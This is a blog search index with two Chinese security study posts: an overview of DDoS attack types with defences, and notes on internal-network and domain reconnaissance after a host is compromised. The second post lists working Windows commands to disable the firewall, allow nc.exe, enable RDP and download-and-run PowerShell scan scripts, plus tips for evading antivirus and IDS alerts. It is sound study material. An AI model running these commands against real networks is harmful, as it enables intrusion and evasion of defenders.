<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[DDoS入门学习]]></title>
    <url>%2FDDoS%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[之前以为DDos很简单，现在发现学问还是大滴很呢！！！ 理论DDOS简介DDOS(Distributed Denial of Service)，又称分布式拒绝服务攻击。是指处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击。由于攻击的发出点是分布在不同地方的，这类攻击称为分布式拒绝服务攻击，其中的攻击者可以有多个。分布式拒绝服务攻击方式在进行攻击的时候，可以对源IP地址进行伪造，这样就使得这种攻击在发生的时候隐蔽性是非常好的，同时要对攻击进行检测也是非常困难的，因此这种攻击方式也成为了非常难以防范的攻击。 DDOS危害出口带宽堵死游戏掉线导致客户流失服务器连接数多，连接资源被耗尽服务器卡、慢、死机、无法连接 流量特点IP地址随机或固定某些IP段随机没有完整完成三次握手地址多数是伪造的请求数量大、快 DDOS攻击类型与防御1.Smurf攻击攻击者向网关(网络广播地址)发送ICMP请求包，并将该ICMP请求报文的源地址伪造成受害主机IP地址，目的地址为广播地址。路由器在接受到该数据包，发现目的地址是广播地址，就会将该数据包广播出去，局域网内所有的存活主机都会受到一个ICMP请求包，源地址是受害主机IP。接下来受害主机就会收到该网络内所有主机发来的ICMP应答报文，通过大量返回的ICMP应答报文来淹没受害主机，最终导致网络阻塞，受害主机崩溃。下面是smurf攻击示意图（盗的图） 防护方案： 禁止路由器广播ICMP请求包； 禁止操作系统对广播发出的ICMP请求包做出响应； 配置防火墙静止来自你所处网络外部的ping包 2.TearDrop攻击是一种畸形报文攻击，基于UDP的病态分片数据包的攻击方法。通过设置错误的片偏移(IP分段)，使得数据包到达目的地时，服务器无法重新组合数据包，因为数据包的组合是通过片偏移来组装的，最终导致崩溃。对比一下正常IP数据包和错误IP数据包这种攻击主要对旧的windows版本和Linux版本有效。 防护：可以检测发来的数据包片偏移是否合法，如果合法在组装，不合法直接丢弃。比如这个：分片重组检查算法 3.Land Attack（着陆攻击）攻击者发动Land Attack攻击时，需要先发出一个SYN数据包，并将数据包的源IP与目的IP都设置成要攻击的目标IP，这样目标在接收到SYN数据包后，会根据源IP回应一个SYN+ACK数据包，即和自己建立一个空连接，然后到达idel超时时间时，才会释放这个连接。攻击者发送大量这样的数据包，从而耗尽目标的TCP连接池，最终导致拒绝服务。 Kali Linux提供的很多工具，都可以实现伪造包的功能，如hping3。 防御方案：这种攻击对早期系统有效。通过防火墙、路由设备，建立规则，丢弃源地址和目标地址相同的SYN、SYN+ACK的TCP。 4.YN FLOOD攻击SYN FLOOD攻击是在TCP三次握手过程中产生的。攻击者通过发送大量伪造的带有SYN标志位的TCP报文，与目标主机建立了很多虚假的半开连接，在服务器返回SYN+ACK数据包后，攻击者不对其做出响应，也就是不返回ACK数据包给服务器，这样服务器就会一直等待直到超时。这种攻击方式会使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的 防御： SYNCheck：使用防护设备，3次握手变成了6次握手，由防护设备检测SYN请求是否合法，通过后再由防护设备将报文转发给服务器，后续报文仍由防护设备代理。 Micro blocks：管理员可以在内存中为每个SYN请求创建一个小索引(小于16字节)，而不必把整个连接对象存入内存。 RST cookies：在客户端发起第一个SYN请求后，服务器故意回应一个错误的SYN+ACK报文。如果合法用户收到这个报文，就会给服务器响应RST报文。当服务器收到这个报文时，就将这个主机的IP记录进合法IP列表，下次该主机发起SYN请求时，就可以直接通过了。 STACK tweaking：管理员可以调整TCP堆栈以减缓SYN泛洪攻击的影响。这包括减小超时时间，等到堆栈存释内放时再分配连接，否则就随机性地删除传入的连接。 5.ACK FLOOD攻击ACK FLOOD攻击是利用TCP三次握手过程。这里可以分为两种。第一种：攻击者伪造大量的SYN+ACK包发送给目标主机，目标主机每收到一个SYN+ACK数据包时，都会去自己的TCP连接表中查看有没有与ACK的发送者建立连接 ，如果有则发送ACK包完成TCP连接，如果没有则发送ACK+RST 断开连接。但是在查询过程中会消耗一定的CUP计算资源。如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。 第二种：利用TCP三次握手的ACK+SYN应答，攻击者向不同的服务器发送大量的SYN请求，这些SYN请求数据包的源IP均为受害主机IP，这样就会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。 通常DDOS攻击会将ACK flood与SYN flood结合在一起，从而扩大威力。 防御方案参考： 采用CDN进行流量稀释； 避免服务器IP暴露在公网上； 通过限速或动态指纹的方式； 利用对称性判断来分析出是否有攻击存在； 在连续收到用户发送的ACK包时，中断回话，让其重连。 6.UDP FLOOD攻击(UDP泛洪攻击)因为UDP不需要三次握手，这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。UDP FLOOD可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。大量小数据包会增大网络设备处理数据包的压力；而对于大数据包，网络设备需要进行分片、重组，最终达到的效果就是占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。 防御方案： 限制每秒钟接受到的流量(可能产生误判)； 通过动态指纹学习(需要攻击发生一定时间)，将非法用户加入黑名单。 7.NTP放大攻击NTP(Network Time Protocol，网络时间协议)，是用来使计算机网络时间同步化的一种协议，使用UDP123端口进行通信。通常在NTP服务器上会有一些调试接口，而利用这些接口中的monlist请求，就可触发放大攻击。当主机向NTP服务器发送monlist查询请求时，NTP服务器会将与之进行时间同步的最后600个IP地址返回。所以攻击者只需要将源地址伪造为受害主机的IP，向NTP服务器发送一个monlist查询请求包，受害主机就会收到大量的UDP响应包。这种攻击在放大攻击里，危害相对较大。 这种攻击产生的原因： 请求与响应数据包不等价； UDP协议的通信模糊性（无数据传输确认机制）； 以及NTP服务器的无认证机制。 防御方案： 使用防 DDoS 设备进行清洗； 加固并升级NTP服务器； 在网络出口封禁 UDP 123 端口； 通过网络层或者借助运营商实施 ACL 来防御； 关闭现在 NTP 服务的 monlist 功能，在ntp.conf配置文件中增加disable monitor选项。 8.DNS放大攻击DNS报文格式(借个图)： 首先，攻击者向僵尸网络发出指令，使僵尸网络中的每一台主机均发出一个伪造源地址的DNS查询请求包，这些请求包查询类型设置为ANY，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。接着查询类型设为递归查询，为什么不是迭代查询呢，仔细看两种查询的过程图可发现，如果迭代查询第一个请求的DNS服务器没有查询到结果，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的；而递归查询却是在查询到结果之后，才返回给查询请求发起者。利用这两个特点，攻击者就可以成功发起DNS放大攻击。这种普通的查询请求可以将攻击流量放大2~10倍，如果想增大攻击倍数，可以使用RFC 2671中定义的DNS拓展机制EDNS0。未使用EDNS0时，若响应包大小小于512字节，就使用UDP封装数据；若响应包大小超过512字节，就使用TCP连接或者服务器截断响应报文，丢弃超过512字节的部分，并把TC位置1。这两种方式都不利于进行DNS放大攻击。然而在开启EDNS0机制后，增加了OPT RR字段，这两个字段包含了能够处理的最大UDP报文大小信息，所以攻击者将这个信息设置的很大，服务器就会根据这个信息生成响应报文。最后看一下DNS放大攻击演示图 1234567# 四个步骤1.攻击者使用受损端点将带有欺骗性IP地址的UDP数据包发送到DNS recursor(递归)。数据包上的欺骗地址指向受害者的真实IP地址。2.每个UDP数据包都向DNS解析器发出请求，通常会传递诸如“ANY”之类的参数，以便接收可能的最大响应。3.在收到请求后，尝试通过响应提供帮助的DNS解析器会向欺骗的IP地址发送大量响应。4.目标的IP地址接收响应，周围的网络基础设施因流量泛滥而变得不堪重负，导致拒绝服务。虽然一些请求不足以取消网络基础设施，但当此序列在多个请求和DNS解析器之间成倍增加时，目标接收的数据放大可能很大。 防御的话，可以参考以下几点： 联系ISP清洗上游流量； DNS服务器只对可信域内提供服务，限制对域外用户提供DNS解析服务； 对单个IP的查询速率做限制； 拥有足够的带宽承受小规模攻击； 关闭DNS服务器的递归查询； 利用防火墙等对ANY Request进行过滤。 源IP验证 - 停止欺骗数据包离开网络 9.SNMP放大攻击SNMP(Simple Network Management Protocol，简单网络管理协议)，它使用UDP 161端口进行通信攻击者向互联网上开启SNMP服务的设备发送GetBulk请求，并使用默认通信字符串作为认证凭据。常见的默认通信字符串如public、private以及一些厂商默认的通信字符串。GetBulk请求是在SNMPv2中添加的的，该请求会让SNMP设备尽可能多的返回数据，这也就是SNMP放大攻击的利用点 攻击者先将源地址改成要攻击的目标IP，再使用默认的通信字符串，向大量SNMP设备发出GetBulk请求，设备收到GetBulk请求数据包后，会将一大段的设备检索信息返回给目标主机，最终目标主机会被这些SNMP设备返回的数据包淹没，导致拒绝服务。 防御措施： 禁止已开启SNMP的设备响应GetBulk请求，避免自己的设备被黑客利用； 更改默认的通信字符串； 修改默认端口161； 隐藏开启SNMP设备的公网IP 10.TFTP放大攻击TFTP（Trivial File Transfer Protocol，简单文件传输协议），使用UDP 69端口进行通信。由于TFTP使用的是不可靠的UDP协议，所以他不能确保发送的任何报文都能真正到达目的地，因此他必须使用定时器来检测并重传报文 FTP协议将数据分成好多个数据块进行传输，每个数据块最大为512字节，客户端在接受到数据块时，需要给服务器端返回一个ACK确认报文，然后才会继续传输下一个报文。若服务器没有收到客户端发来ACK报文，则在时间到达超时计数器时，便会开启重传机制，这也就是攻击利用点。攻击者利用TFTP协议上的缺陷，伪造源地址向服务器发起请求，服务器回复的第1个data数据包后无法收到客户端发送的ACK。此时TFTP就会利用他的重传机制，定时重传第1个data数据包，当攻击者发出大量的这种请求时，TFTP放大攻击也就发生了 防御方案可参考如下： 不要将TFTP服务器暴露在公网上； 对流经TFTP服务的流量进行入侵检测； 将重传（数据包）率设置为1； 只为信任域内的主机提供服务。 11.CC攻击CC攻击（ChallengeCollapsar）又称作HTTP 泛洪攻击。原理是攻击者控制肉鸡、僵尸网络或使用代理服务器，不停地向目标的web服务发送大量合法请求，使得正常用户的web请求处理缓慢甚至得不到处理，制造大量的后台数据库查询动作，消耗目标CPU资源，最终导致服务器宕机崩溃。这种攻击方式不需要很大的带宽，且无法使用伪造IP地址进行攻击，需要真实的机器与web服务器建立连接，因为HTTP协议是建立在TCP协议上，必须先进行TCP三次握手才能进行HTTP通信。如果目标web服务器支持HTTPS，那么发起的HTTPS泛洪攻击还能穿透一些防护设备。 ddos攻击和cc攻击区别知主要是针对对象的不同：ddos是主要针对IP的攻击，而CC攻击的主要是网页。CC攻击相对来说，攻击的危害不是毁灭性的，但是持续时间长;而ddos攻击就是流量攻击，这种攻击的危害性较大，通过向目标服务器发送大量数据包，道耗尽其带宽，更难防御。 防御方案： 必要时将网页做成静态，减少数据库的使用； 通过缓存的方式进行，尽量由设备的缓存直接返回结果来保护后端业务 Token随IP地址变化 限制连接数量； 修改最大超时时间； 让用户手动输入验证码； 在response报文中添加特殊字段，验证IP合法性； 屏蔽频繁访问服务器的主机IP。 一个防CC攻击的脚本：https://zhangge.net/4649.html 参考文章：https://www.jianshu.com/p/dff5a0d537d8 12.HTTP慢速攻击Slow HTTP Dos AttACKs（慢速HTTP拒绝服务攻击）黑客模拟正常用户向web服务器发送慢速http请求，由于是慢速的，服务器端需要保持连接资源，直到数据传输结束或请求结束才可释放连接。当服务器端建立了大量这样的慢速连接，就会导致服务器拒绝服务。这种攻击可以分为两类：一类是客户端发数据，另一类是客户端读取服务器发来的数据。HTTP慢速攻击对基于线程处理的web服务器影响显著，如apache、dhttpd，而对基于事件处理的web服务器影响不大，如nginx、lighttpd。 HTTP慢速攻击还可以细分成以下几种攻击方式：a. Slowloris攻击方式123HTTP协议规定请求头以一个空行结束，所以完整的http请求头结尾是\r\n\r\n。然而'使用非正常的\r\n来结尾'，就会导致服务端认为我们的请求头还没结束，等待我们继续发送数据直到超时时间。# CRLF（Carriage Return Line Feed）表示回车换行 b. Slow post攻击方式123456在http头部信息，可以使用content-length声明HTTP消息实体的传输长度，服务器端会content-length的值作为HTTP BODY的长度。利用这一特点，攻击者'把content-length设置得很大的，然后缓慢发送数据部分'，比如一次只发送一个字节，这样服务器端就要一直保持连接，直到客户端传完所有的数据。# 利用工具 slowlorishttps://github.com/gkbrk/slowloris.git参考文章：https://www.fujieace.com/hacker/tools/slowloris-dos.html c. Slow read攻击方式12攻击者发送一个完整的HTTP数据请求，之后服务器会给出响应，这时攻击者再'将自己的TCP窗口大小设置的很小'，服务器会根据客户的TCP窗口大小来传送数据。由于客户端的TCP窗口大小很小，服务器只能缓慢的传输数据给客户端。当建立大量的这种连接时，web应用的并发连接池将被耗尽，最终导致拒绝服务。 d. Apache range header攻击123# 这种攻击方式只针对apache当客户端传输大文件时会有range字段，表示将大文件分段，分成几个小段进行传输。例如攻击者将一个文件按照一个字节一段，分成好多段，这样就会造成传输数据缓慢，长时间占用连接，消耗服务器CPU和内存资源 防御这里至只看apache的防护策略(具体的需要实践)1234# 设置并使用以下模块mod_reqtimeout 模块 # 控制请求数据传输的超时时间及最小速率mod_qos 模块 # Apache的一个服务质量控制模块，用户可配置各种不同阈值mod_security模块 # 一个开源的WAF模块，有专门针对慢速攻击防护的规则 对于其他中间件：参考文章 13.XSS-DOS利用网站存在的存储型XXS漏洞，在网站中插入恶意的javascript代码。代码的功能是不断向web服务器发起大量请求，从而导致服务器宕机，无法响应正常用户的请求 由于这种攻击的是由存储型XSS导致的，我们再防御方面就要考虑如何防御存储型XSS。防御策略如下： 对用户的输入以及url参数进行特殊字符过滤； 对输出内容进行编码转换； 结合黑白名单机制; 等防御存储型XSS的方式 14.时间透镜攻击通过控制相同源和相同目的IP报文，使得走不同路径的数据包，在同一时刻到达目标服务器，从而达到流量集中攻击的目的。 防御方案： 增加抖动，干扰攻击路径，使得数据包无法预期到达； 由运营商禁止源路由。 采用高性能的网络设备； 充足的网络带宽保证； 升级主机服务器硬件； 避免将服务器的真实IP暴露在公网中； 使用CDN对流量进行稀释，当大流量稀释到各个CDN节点时，再对流量进行清洗，从而达到防护源站的目的（然而这种防御方式只能用在对域名发起的DDOS攻击，如果攻击者直接对IP进行攻击，则需要使用anycast技术来防御）。 可以参考：http://icir.org/vern/papers/lensing.oak15.pdfhttp://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=7163026https://www.cnblogs.com/h2zZhou/p/6513238.htmlhttps://www.youtube.com/watch?v=QwAHNnKDVxQhttps://mp.weixin.qq.com/s?__biz=MzI2NjUwNjU4OA==&amp;mid=2247483685&amp;idx=1&amp;sn=8ac38ff22d571bbbf7716cb9e83b9b35&amp;chksm=ea8c5916ddfbd00008d9b28e22fccba8c201ce78c70c2d78d10ee732f22a39ccf46d4b197634&amp;mpshare=1&amp;scene=23&amp;srcid=0831Wr5YJPYzSrQU6gnfGVd0 所有这些方案都不完美各有利弊，最终的策略可能是几种方案的结合使用，形成防御体系，将攻击提前化解在局部，不至于影响整个系统。 实践暂时有待实践 参考(基本是完全参考大佬的，整理的太全了)：https://xz.aliyun.com/t/71https://xz.aliyun.com/t/70 其他链接资源：https://www.freebuf.com/articles/network/76021.htmlhttps://www.cnblogs.com/wuyuan2011woaini/p/5800062.htmlhttps://www.cnblogs.com/micr067/p/12519779.htmlhttps://yq.aliyun.com/articles/480125/ kali下的DDos测试工具]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>DDos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网第二章-内网基础信息搜集]]></title>
    <url>%2F%E5%86%85%E7%BD%91%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%2F</url>
    <content type="text"><![CDATA[二 . 内网信息收集 本机信息收集 1)查询网络配置123net view # 查看工作组ipconfig /all # 也可以看到是否有域 2) 查询用户列表12345net user # 查看本机用户列表net localgroup administrators # 本机管理员（通常含有域用户）query user || qwinsta # 查看当前在线用户（提前看看管理员是否在线）# 企事业单位的用户名有规则性 3)查询进程列表123456# 看装了什么软件,vpn,杀毒软件,虚拟机,某服务(推敲域内是否都装了这个软件)# 看进程运行的权限tasklist /v# 或用wmicwmic process list brief 4) 查看本机服务信息1wmic service list brief 5) 查询操作系统及安装软件版本信息123456789101112# 获取操作系统和版本信息()systeminfo |findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; # 英文版本的话是这样systeminfo |findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; # 中文版本的话是这样# 查看系统体系结构echo %PROCESSOR_ARCHITECTURE% # amd64# 查看安装软件和版本、路径等wmic product get name,version# powershell查看安装软件信息powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot; 6) 查询端口列表123netstat -ano# 根据端口综合判断，如果是内容用来更新的服务器/DNS服务器/代理服务器 7) 查询启动信息1wmic startup get command,caption 8) 查看计划任务1schtasks /query /fo LIST /v 9) 查看主机开机时间1net statistics workstation 10) 列出或断开本地计算机与所连接的客户端之间的会话1net session 11) 查询补丁信息1234systeminfo #可以看到很多信息(域内主机补丁是批量打的)# 或用wmicwmic qfe get Caption,Description,HostFixID,InstalledOn 12) 查询本机共享123456789# 默认是开着C，IPC，ADMINS# 不单单是看本机的信息(通过本机判断域内情况)net sharenet share \\yourHostnamewmic share get name,path,status# wmic： 是windows自带的一个命令工具，有很多功能(交互/非交互模式) 13) 查询路由表和所有可用的ARP缓存表1234route print#arp -a 14) 查询防火墙配置12345678910111213141516171819202122232425# '查看'防火墙配置netsh firewall show config## '关闭'防火墙(msf里面也有)#1.对win server 2003以及之前的版本netsh firewall set opmode disable#2.win server 2003之后的版本netsh advfirewall set allprofiles state off # 自定义防火墙日志储存位置netsh advfirewall set currentprofile logging filename "C:\windows\temp/fw.log"## '修改'防火墙相关配置(比关闭防火墙动静小，改完记得恢复规则)#1.对win server 2003以及之前的版本,允许指定程序全部连接netsh firewall add allowprogram c:\nc.exe "allow nc" enable#2.win server 2003之后的版本允许指定程序连入netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C: \nc.exe"允许指定程序连出netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C: \nc.exe"允许3389端口放行netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow 15) 查看代理配置情况1reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" 16) 查询并开启远程连接服务（比较老的知识点）12345678910111213141516171819202122##### 查看远程连接端口Reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber###### 开启的3389方法：# 1.通用 开3389(优化后)： wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 1 # 2.For Win2003: REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f # 或者 wimc path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowsconnections 1 # 3.For Win2008: REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f # 4.For Every: cmd开3389 win08 win03 win7 win2012 winxp # win08，三条命令；win2012通用；win7前两条即可(权限需要run as administrator): wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1 wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName =&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1 reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 17) 自动化信息搜集 写一个脚本，把上面要搜集的信息都进行 WMIC(win管理工具命令行)的搜集信息的写好的脚本(执行该脚本后，会自动生成一个html文件) 链接 18) Empire下的主机信息搜集1.Empire提供了用于收集主机信息的模块，输入命令usemodoule situational_awareness/host/winenum即可看到一些信息2.usemodoule situational_awareness/host/computerdetails 包含了几乎所有有用的东西(但是运行这个模块需要管理员权限) 查询当前权限 1whoami # 查询当前权限 获取到一台主机的权限后，有如下三种情况： 本地普通用户 本地管理员用户 （可以用来查询域内信息, 比如： net view /xx/yy） 域内用户(域名\用户) 本地管理员权限默认和直接提升为Ntauthority或System权限，因此，在域中，除普通用户外，所有的机器都有一个机器用户(用户名是机器名+$)。本质上，机器的system用户对应的就是域里面的机器用户，所以使用system权限可以运行域内的查询命令 12whoami /all # 获取域SID net user xxx /domain # 查询指定用户的详细信息 判断是否存在域 如果存在域，就需要判断所控主机是否在域内 几种方法：1234567891011121314151617181920# 1.ipconfig /all # 可以查看网关IP地址、DNS的ip地址、域名、本机是否和dns处在同一网段# 然后，可以通过nslookup反解析域名的ip地址，用解析得到的ip地址进行对比，判断DC和DNS是否在同一台服务器上# 2.查看系统详细信息(有&quot;域&quot;的字段)，如果&quot;域&quot;为WORKGROUP则表示当前服务器不在域内systeminfo # 3.查询当前登录域及登录用户信息(&quot;工作站域DNS名称&quot;为域名，如果为WORKGROUP则表示当前为非域环境)# &quot;登录域&quot;表示当前登录的用户是域用户还是本地用户net config workstation# 4.判断主域(域服务器通常会作为时间服务器使用)net time /domain # 三种情况： 1.存在域，当前用户不是域用户 2.存在域，当前用户是域用户 3.当前网络环境为工作组，不存在域 域内存活主机探测 避免除法防病毒软件报警 不要使用暴力的; 不要使用图形化的工具 使用powershell/vbs等自带的 白天上班时间探测一遍，深夜分别探测一遍（对比分析存活主机对应的IP地址i） 1.利用netbios快速探测 （优先使用这个协议,会被认为是正常的通信）工具：nbtbios使用方法1234# win和Linux下都有# 这里用win版本的，上传到目标主机(推荐放到目标机器的windows/temp下面)nbtscan.exe 192.168.111/24 参数说明(结果的第三列)： 2.利用icmp协议快速探测内网工具：1.ping命令:12# for循环ping整个网段for /L %l in (1,1,254) Do @ping -w 1 -n 192.168.111.%l |findstr "TTL=" 2.VBS脚本123没写# cscript xxx.vbs 运行脚本 3.利用arp扫描完整探测内网工具：1.arp-scan12# 上传arp.exe 到目标机器运行Arp.exe -t 192.168.0/20 2.Empire中的arpscan模块123usemodule situational_awareness/net/work/arpscanset ...execute 3.NiShang里面的脚本: Invoke-ARPScan.ps11234567# a.远程下载运行powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 192.168.1.0/20" &gt;&gt; C:\windows\temp\log.txt# b.本地运行(先上传脚本到目标)powershell.exe -nop -exec bypass -Command "&amp;&#123;Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/20&#125;" &gt;&gt; C:\windows\temp\log.txt# c.无条件运行(没痕迹) 3.利用常规tcp/udp端口扫描探测内网工具：scanline (比较老, 但是好用，可在所有win版本使用，动静小)12# -t 是tcp端口， -u是udp端口sl -h -t 22,80-89,110,389,445,3389,1099,1433,6379,27017,7001,8080,1521,3306,5432 -u 53,161,137,139 -O c:\windows\temp\sl_res.txt -p 192.168.1.1-254 /b 扫描域内端口 通过端口，不仅能了解目标主机所开放的服务，还能找出其开放服务的漏洞、分析目标网络的拓扑结构等 端口的banner信息 端口上运行的服务 常见应用的默认端口 工具： 1.telent命令(针对单个，肯定不会触发报警) 1telnet DC1 22 # 查看某台主机某个端口是否开放 2.S扫描器 123# 早期的工具，支持大网段S.exe TCP 192.168.1.1 192.168.1.112 22,445,3389,1433,6379,8080,80,23,21,25,110,3306,1521,111,445,7001 256 /Banner /save# 结果默认保存在安装目录下的result.txt文件中 3.Metasploit内置的端口扫描模块: 1234search portscanuse auxiliary/scanner/portscan/tcp # 还有其他模块set ...run 4.PowerSploit下的Invoke-portscan.ps1脚本 (不会下载到本地) 1powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1');Invoke-portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,5432,8080,3389,22' -oA C:\windows\temp\log.txt" 5.NiShang的Invoke-PortScan模块 123Get-Help Invoke-PortScan -full# ResolveHost 解析主机名Invoke-PortScan -StartAddress 192.168.0.1 -StopAddress 192.168.0.255 -ResolveHost 6.nmap 7.masscan 8.其他端口扫描工具 注意扫描是否会触发IDS等设备 端口Banner信息12通过扫描发现了端口，可以使用客户端连接工具或nc，获取服务端的Banner信息 获取Banner信息之后，可以在漏洞库中查找相应的CVE编号的POC/Exp, 在Exploit-DB、Seebug、安全焦点的BugTraq 等平台查看相关漏洞利用工具，然后到目标系统中验证漏洞是否存在，从而有针对性地进行安全加固 常见端口机器攻击方向：链接 收集域内基础信息 12345678910111213141516171819# 域用户才有权限进行以下查询（本机的system权限也可以，机器的用户名+$）# 查询域net view /domain # 查询域内所有计算机(可通过主机名对主机角色进行初步判定, 比如web可能是web服务器)net view /domain:domainName net view /domain:WORKGROUP # 查看域内所有用户组net group /domain # 查看域成员计算机列表net group &quot;domain computers&quot; /domain # 获取域密码信息(密码策略,密码长度,错误锁定等信息)net accounts /domain # 获取域信任信息nltest /domain_trusts 查找 域控制器(DC) 12345678910111213# 查看DC的机器名nltest /DCLIST:xxx# 查看DC的主机名nslookup -type=SRV _ldap._tcp# 查看当前时间net time /domain# 查看域控制器组net group "Domain Controllers"/domainnetdom query pdc 域内用户和管理员的获取 1.查询所有域用户列表：12345678910111213141516net user /doamin # 向DC进行查询域用户列表wmic useraccount get /all # 获取域内用户详细信息dsquery user # 查看存在的用户# 常用的dsquery命令dsquery computer # 查找目录中的计算机dsquery contact # 查找目录中的联系人dsquery subnet # 查找目录中的子网dsquery group # 查找目录中的组dsquery ou # 查找目录中的组织单位dsquery site # 查找目录中的站点dsquery user # 查找目录中的用户dsquery quota # 查找目录中的配额规定dsquery partition # 查找目录中的分区dsquery * - # 用通用的 LDAP 查询来查找目录中的任何对象net localgroup administrators # 查询本地管理员组用户(实际中，为了方便管理，会有域用户被设置为域机器的本地管理员用户) 2.查询域管理员用户组12345# 查询域管理员用户net group "doamin admins" /domain# 查询域管理员用户组net group "Enterprise Admins" /domain 定位域管理员 (很重要) 当一台机器加入域后，会默认给域管理员组赋予本地系统管理员权限 常规定位域内管理员方法： 第二种方法使用较多 日志 （本地机器的管理员日志，可以使用脚本或wevtutil导出并查看） 会话 （域内每个机器的等会会话，可以匿名查询，无需权限，可以使用netess.exe或powerview等工具查询） 常用的定位域管理员工具：1.psloggedon.exe1234567891011# 下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon# 查看本地登录的用户 和 通过本地计算机或远程计算机的资源登录的用户# 如果指定的是"用户名"而不是计算机名，则会搜索网上邻居的计算机，并显示该用户当前是否已经登录# 某些功能需要管理员权限psloggedon \\DC1# - 显示支持的选项和用于输出值的单位# -l 仅显示本地登录，不显示本地和网络资源登录# -x 不显示登录时间# \\computername: 指定要列出登录信息的计算机name# username: 指定用户名 2.PVEFindADUser.exe123456789# 下载地址： https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn# 可用于查找活动目录# 需要 .net 2.0, 且 需管理员权限PVEFindADUser.exe &lt;参数&gt;# PVEFindADUser.exe --current # 显示域中所有计算机上当前登录的用户PVEFindADUser.exe --last # 显示域中目标计算机上最后登录的用户# 参数 -noping 阻止在之前ping 4.netsess.exe123456789# 枚举工具netsess.exe &lt;参数&gt;# -f file.txt 指定要提取主机列表的文件# -e file.txt 指定要排除的主机名的文件# -o file.txt 将所有输出都重定向到指定的文件# -d domain 指定要提取主机列表的域，若没指定，则从当前域中提取主机列表# -g group 指定搜索的组名，若没指定，就从当前域中提取主机列表# -c 对已找到的共享目录/文件的访问权限进行检查 5.NetView.exe1# 地址： https://github.com/mubix/netview 6.Nmap的NSE脚本1234567# 下载地址 https://nmap.org/nsedoc/scripts/smb-enum-sessions.htmlsmb-enum-session.nse # 获取远程机器的登录会话,查看当前是否有用户登录smb-enum-domains.nse # 获取主机信息、用户、可使用密码策略的用户等smb-enum-users.nse # 如果获得的权限有限，使用这个获得更多的域用户的信息smb-enum-shares.nse # 遍历远程主机的共享目录smb-enum-processs.nse # 对主机的系统进程进行遍历（可以知道主机正在运行什么软件）smb-os-discovery.nse # 收集目标的一些信息 7.PowerShell 中， PowerView脚本： Invoke-UserHunter123456# 下载地址： https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView# Invoke-StealthUserHunter 只需要进行一次查询，就可以获取域里面的所有用户(隐蔽性高，但不一定全面)# Invoke-UserHunter 找到域内特定的用户群，接收用户名、用户列表和域组查询powershell -nop -exec bypass -Command "&amp; &#123;Import-Module .\PowerView.ps1; Invoke-UserHunter&#125;" 8.Empire下user_hunter模块12# 也有类似Invoke-UserHunter的模块： user_hunter --&gt; 用于查找域管理员登录的机器usemodule situational_awareness/network/powerview/user_hunter 查找域管理进程 如果在无法立即拥有权限的系统中获得管理员进程，那么通常可以采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到测试的路径 a.本机检查1．获取域管理员列表1net group "domain admins" /domain 2．列出本机所有进程及进程用户1tasklist /v 3．寻找是否有进程所有者为域管理员的进程能用上面两种方法找到自然最好，但实际往往并非如此…… b.查询域控制器的与用户会话（脚本） 收集域控制器的列表 123# 可以使用LDAP查询# netnet group "domain Controllers" /domain 收集域管理员的列表 